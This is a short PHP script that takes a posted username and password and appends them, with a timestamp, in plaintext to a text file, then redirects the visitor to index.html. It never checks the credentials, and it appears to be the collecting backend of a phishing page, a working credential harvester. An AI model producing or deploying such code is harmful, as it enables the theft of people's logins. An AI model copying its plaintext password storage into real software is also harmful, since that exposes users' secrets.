<?php
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
	$username = $_POST['username'];
	$password = $_POST['password'];

	$filename = 'login_info.txt';
	$file = fopen($filename, 'a');

	$timestamp = date('Y-m-d H:i:s');
	$data = "$timestamp - Username: $username, Password: $password\r\n";

	fwrite($file, $data);
	fclose($file);

	echo 'Login information saved successfully!';
	header('location:index.html');
	exit;
} else {
	echo 'Invalid request!';
}
?>